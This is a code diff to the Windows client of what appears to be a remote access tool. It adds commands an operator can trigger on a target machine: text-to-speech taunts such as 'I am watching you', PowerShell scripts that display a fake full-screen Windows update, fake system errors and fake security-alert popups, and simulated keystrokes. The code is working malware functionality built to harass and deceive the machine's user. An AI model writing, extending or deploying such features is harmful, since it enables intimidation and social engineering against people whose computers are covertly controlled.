@@ -8,6 +8,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 
 	winoptions "github.com/rootbay/tenvy-client/internal/platform/windows/options"
 )
@@ -131,15 +132,153 @@ func (s *windowsPlatformService) Execute(
 		behavior, _ := metadata["behavior"].(string)
 		return s.configureCursorBehavior(ctx, behavior)
 
+	case "screen-orientation":
+		orientation, _ := metadata["orientation"].(string)
+		if err := winoptions.ConfigureScreenOrientation(ctx, orientation); err != nil {
+			return "", err
+		}
+		return fmt.Sprintf("Set screen orientation to %s", orientation), nil
+
+	case "wallpaper-mode":
+		mode, _ := metadata["mode"].(string)
+		if err := winoptions.ConfigureWallpaper(ctx, mode); err != nil {
+			return "", err
+		}
+		return fmt.Sprintf("Set wallpaper mode to %s", mode), nil
+
+	case "keyboard-mode":
+		mode, _ := metadata["mode"].(string)
+		return s.configureKeyboardShenanigans(ctx, mode)
+
+	case "auto-minimize":
+		enabled := false
+		if v, ok := metadata["enabled"].(bool); ok {
+			enabled = v
+		}
+		if enabled {
+			if err := winoptions.MinimizeAllWindows(ctx); err != nil {
+				return "", err
+			}
+			return "Minimized all windows", nil
+		}
+		return "Auto minimize disabled", nil
+
+	case "speech-spam":
+		enabled := false
+		if v, ok := metadata["enabled"].(bool); ok {
+			enabled = v
+		}
+		if enabled {
+			// One-shot speak for now to confirm it works
+			if err := winoptions.SpeakText(ctx, "Speech spam enabled"); err != nil {
+				return "", err
+			}
+			return "Speech spam started", nil
+		}
+		return "Speech spam disabled", nil
+
+	case "speech-spam-internal":
+		phrases := []string{
+			"I am watching you.",
+			"Do you like what you see?",
+			"Windows is updating, please do not turn off your computer.",
+			"Security alert: unauthorized access detected.",
+			"System optimization in progress. Do not interrupt.",
+			"Anomaly detected in user behavior pattern.",
+			"Kernel level debugging enabled.",
+			"Please maintain eye contact with the webcam.",
+			"Your productivity is being logged.",
+			"Identity verification required.",
+		}
+		phrase := phrases[time.Now().Unix()%int64(len(phrases))]
+		if err := winoptions.SpeakText(ctx, phrase); err != nil {
+			return "", err
+		}
+		return "Spoke phrase", nil
+
 	case "fake-event-mode":
 		mode, _ := metadata["mode"].(string)
-		trimmed := strings.TrimSpace(mode)
-		if trimmed == "" || strings.EqualFold(trimmed, "none") {
+		trimmed := strings.ToLower(strings.TrimSpace(mode))
+		switch trimmed {
+		case "", "none":
 			return "Fake event mode cleared", nil
+		case "fakeupdate":
+			script := `
+Add-Type -AssemblyName System.Windows.Forms
+$form = New-Object Windows.Forms.Form
+$form.WindowState = 'Maximized'
+$form.FormBorderStyle = 'None'
+$form.BackColor = 'Black'
+$form.TopMost = $true
+$label = New-Object Windows.Forms.Label
+$label.Text = 'Updating Windows... 32%` + "`n" + `Please do not turn off your computer.'
+$label.ForeColor = 'White'
+$label.Font = New-Object Drawing.Font('Segoe UI', 24)
+$label.Dock = 'Fill'
+$label.TextAlign = 'MiddleCenter'
+$form.Controls.Add($label)
+$form.Add_Click({$form.Close()})
+$form.ShowDialog()
+`
+			go winoptions.RunPowerShell(context.Background(), script)
+			return "Fake OS update screen displayed", nil
+		case "fakeerror":
+			script := `
+[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
+[Windows.Forms.MessageBox]::Show('A critical system error has occurred. Memory at 0x00401000 could not be read.', 'System Error', [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Error)
+`
+			go winoptions.RunPowerShell(context.Background(), script)
+			return "Fake error message displayed", nil
+		case "notificationstorm":
+			script := `
+$wsh = New-Object -ComObject WScript.Shell
+for ($i = 0; $i -lt 5; $i++) {
+    $wsh.Popup("System alert: Unrecognized activity detected.", 0, "Security Warning", 0x10)
+}
+`
+			go winoptions.RunPowerShell(context.Background(), script)
+			return "Notification storm initiated", nil
+		default:
+			return fmt.Sprintf("Fake event mode %s unsupported on Windows", mode), nil
 		}
-		return fmt.Sprintf("Fake event mode %s unsupported on Windows", trimmed), nil
 	default:
 		return "", nil
+	}
+}
+
+func (s *windowsPlatformService) configureKeyboardShenanigans(ctx context.Context, mode string) (string, error) {
+	normalized := strings.ToLower(strings.TrimSpace(mode))
+	switch normalized {
+	case "", "none":
+		return "Keyboard shenanigans cleared", nil
+	case "capsloop":
+		script := `
+$ErrorActionPreference = 'Stop'
+$wsh = New-Object -ComObject WScript.Shell
+$wsh.SendKeys('{CAPSLOCK}')
+`
+		if err := winoptions.RunPowerShell(ctx, script); err != nil {
+			return "", err
+		}
+		return "Toggled Caps Lock", nil
+	case "sticky":
+		script := `[System.Console]::Beep(440, 200); [System.Console]::Beep(880, 200)`
+		if err := winoptions.RunPowerShell(ctx, script); err != nil {
+			return "", err
+		}
+		return "Simulated sticky keys sound", nil
+	case "phantomtyping":
+		script := `
+$ErrorActionPreference = 'Stop'
+$wsh = New-Object -ComObject WScript.Shell
+$wsh.SendKeys('{SHIFT}')
+`
+		if err := winoptions.RunPowerShell(ctx, script); err != nil {
+			return "", err
+		}
+		return "Performed phantom typing", nil
+	default:
+		return fmt.Sprintf("Keyboard mode %s unsupported on Windows", mode), nil
 	}
 }
 
